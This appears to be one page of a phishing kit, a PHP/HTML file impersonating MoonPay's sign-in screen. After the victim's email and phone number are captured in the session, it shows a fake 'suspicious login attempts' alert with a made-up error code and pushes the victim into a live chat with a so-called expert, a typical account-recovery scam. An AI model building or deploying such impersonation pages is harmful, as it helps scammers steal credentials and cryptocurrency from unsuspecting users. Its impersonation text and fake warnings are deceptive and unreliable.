<?php include_once './config.php'; ?>
<html lang="en">
    <?php
    $title = 'MoonPay: Buy and sell Bitcoin, Ethereum, and other cryptos';
    include_once './includes/meta.php';
    if (empty($_SESSION["email"])) {
        redirect(base_url());
    }
    if (empty($_SESSION["phone_number"])) {
        redirect(base_url('verify.php'));
    }
    ?>
    <body>

        <div class="container-fluid d-flex align-items-center justify-content-center" style="height: 100%">
            <div class="row">
                <div class='rounded-5 p25 mt30 bg-white text-center' style="border: 1px #edf2f9 solid; max-width: 400px; ">
                    <h1 class="fs15">Sign in with MoonPay</h1>
                    <div class="py30 lh20 text-danger">Your Account shows suspicious Login Attempts. Please do not close this page and chat immediately with our live Expert inorder to recover your Moonpay Account.</div>
                    <div class='fs18 pt25 text-center fw-semibold my30'>Error CODE: EBRX1:6X76D</div>
                    <div class="d-grid my30">
                        <a href="javascript:void(Tawk_API.toggle())" class="btn btn-success btn-primary-2 border-0 rounded-pill rounded-0 py12 fs15 w-100" >Ask expert</a>
                    </div>
                    <div class="row">
                        <div class="col-sm-12 text-secondary mt20 fs12 lh20">
                            <span>This site is protected by reCAPTCHA and the Google</span>
                            <a href="https://policies.google.com/privacy" target="_blank" rel="noopener noreferrer" class="text-dark text-decoration-none">
                                Privacy Policy
                            </a> and
                            <a href="https://policies.google.com/terms" target="_blank" rel="noopener noreferrer" class="text-dark text-decoration-none">
                                Terms of Service
                            </a> apply.
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <?php include_once './includes/footer.php'; ?>
    </body>
</html>